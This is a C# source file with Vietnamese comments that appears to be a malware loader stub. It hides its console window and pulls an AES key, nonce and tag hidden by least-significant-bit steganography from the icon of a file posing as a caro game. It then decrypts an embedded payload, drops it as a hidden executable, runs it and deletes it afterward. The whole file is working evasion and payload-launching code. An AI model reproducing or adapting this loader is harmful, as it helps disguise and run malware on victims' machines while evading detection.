// -------------NOTE----------------//
// You must be rebuild solution     //
//----------------------------------//
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;


class Program
{
    [DllImport("kernel32.dll")]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll")]
    private static extern bool FreeConsole();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;
    static void Main()
    {

        // Ẩn cửa sổ console
        IntPtr consoleWindow = Process.GetCurrentProcess().MainWindowHandle;
        ShowWindow(consoleWindow, SW_HIDE);
        // Đường dẫn tệp tin .ico chứa dữ liệu đã được dấu
        string inputIconFile = "Game-co-caro.exe";


        // Trích xuất dữ liệu từ icon
        string encodedData = ExtractDataFromIcon(inputIconFile);
        string[] parts = encodedData.Split('|');


        // Giải mã Base64 để lấy lại giá trị key, nonce và tag
        byte[] key = Convert.FromBase64String(parts[0]);
        byte[] nonce = Convert.FromBase64String(parts[1]);
        byte[] tag = Convert.FromBase64String(parts[2]);

        // Đọc tệp tin mã hóa và tag từ tệp tin đầu ra
        byte[] ciphertext = File.ReadAllBytes("bin");

        // Giải mã với AES-256-GCM
        byte[] plaintext;
        using (AesGcm aes = new AesGcm(key))
        {
            plaintext = new byte[ciphertext.Length];
            aes.Decrypt(nonce, ciphertext, tag, plaintext);
        }
        File.WriteAllBytes("output.exe", plaintext);
        FileInfo f = new FileInfo("output.exe");
        f.Attributes = FileAttributes.Hidden;
        // Khởi động tệp tin output.exe
        Process process = new Process();
        process.StartInfo.FileName = "output.exe";


        process.Start();

        // Đợi tín hiệu dừng chạy từ output.exe
        process.WaitForExit();

        // Xoá tệp tin output.exe
        File.Delete("output.exe");
    }

    static string ExtractDataFromIcon(string inputIconFile)
    {
        // Đọc icon từ tệp tin .ico
        Icon icon = Icon.ExtractAssociatedIcon(inputIconFile);

        // Chuyển icon thành bitmap để thực hiện các thao tác pixel
        Bitmap bitmap = icon.ToBitmap();
        // Đọc các bit đã được dấu trong bitmap để lấy dữ liệu
        string message = string.Empty;
        char ch = (char)0;
        int bitCount = 0;
        for (int row = 0; row < bitmap.Height; row++)
        {
            for (int col = 0; col < bitmap.Width; col++)
            {
                Color pixelColor = bitmap.GetPixel(col, row);
                for (int color = 0; color < 3; color++)
                {
                    if (bitCount < 8)
                    {
                        if (GetLSB(pixelColor, color))
                            ch |= (char)(1 << (7 - bitCount));

                        bitCount++;
                    }

                    if (bitCount == 8)
                    {
                        if (ch == '\0')
                            return message;

                        bitCount = 0;
                        message += ch;
                        ch = (char)0;
                    }
                }
            }
        }


        return message;
    }
    static bool GetLSB(Color pixel, int color)
    {
        bool value;
        switch (color)
        {
            case 0:
                value = (pixel.R & 1) != 0;
                break;
            case 1:
                value = (pixel.G & 1) != 0;
                break;
            case 2:
                value = (pixel.B & 1) != 0;
                break;
            default:
                throw new ArgumentException("Invalid color value. Expected values: 0 (R), 1 (G), 2 (B).");
        }
        return value;
    }

}
